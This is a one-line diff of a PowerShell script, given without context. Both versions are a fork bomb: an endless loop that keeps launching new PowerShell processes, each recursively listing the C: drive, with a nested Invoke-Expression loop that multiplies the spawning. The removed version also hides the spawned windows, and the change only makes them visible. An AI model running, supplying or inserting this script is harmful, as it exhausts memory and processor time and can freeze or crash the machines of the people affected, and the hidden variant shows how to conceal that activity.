@@ -1,1 +1,1 @@
-while($true) {    Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:" -WindowStyle hidden;    Invoke-Expression -Command 'while($true) {Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:" -WindowStyle hidden}';}
+while($true) {    Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:";    Invoke-Expression -Command 'while($true) {Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"}';}
